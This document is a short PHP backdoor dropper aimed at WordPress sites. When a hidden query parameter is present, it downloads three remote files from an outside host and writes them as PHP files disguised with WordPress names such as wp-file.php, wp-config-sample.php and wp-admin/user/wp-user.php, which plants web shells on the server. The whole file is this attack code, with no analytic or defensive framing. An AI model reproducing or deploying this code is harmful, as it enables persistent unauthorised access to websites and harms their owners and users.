<?php
if(isset($_GET['rizky07']))
{
function http_get($url){
$im = curl_init($url);
curl_setopt($im, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($im, CURLOPT_CONNECTTIMEOUT, 10);
curl_setopt($im, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($im, CURLOPT_HEADER, 0);
return curl_exec($im);
curl_close($im);
}

$check=$_SERVER['DOCUMENT_ROOT'] . "/wp-includes/wp-file.php" ;
$text = http_get('http://picashop.id/wp-content/plugins/rizky07/wp-file.txt');
$op=fopen($check, 'w');
fwrite($op,$text);
fclose($op);
if(file_exists($check)){
echo "Dont delete<br>";
}else 
echo "";

$check2=$_SERVER['DOCUMENT_ROOT'] . "/wp-config-sample.php" ;
$text2 = http_get('http://picashop.id/wp-content/plugins/rizky07/wp-config-sample.txt');
$op2=fopen($check2, 'w');
fwrite($op2,$text2);
fclose($op2);
if(file_exists($check2)){
echo "Dont delete<br>";
}else 
echo "";

$check3=$_SERVER['DOCUMENT_ROOT'] . "/wp-admin/user/wp-user.php" ;
$text3 = http_get('http://picashop.id/wp-includes/tools/kii.txt');
$op3=fopen($check3, 'w');
fwrite($op3,$text3);
fclose($op3);
if(file_exists($check3)){
echo "Dont delete<br>";
}else 
echo "";

}
?>
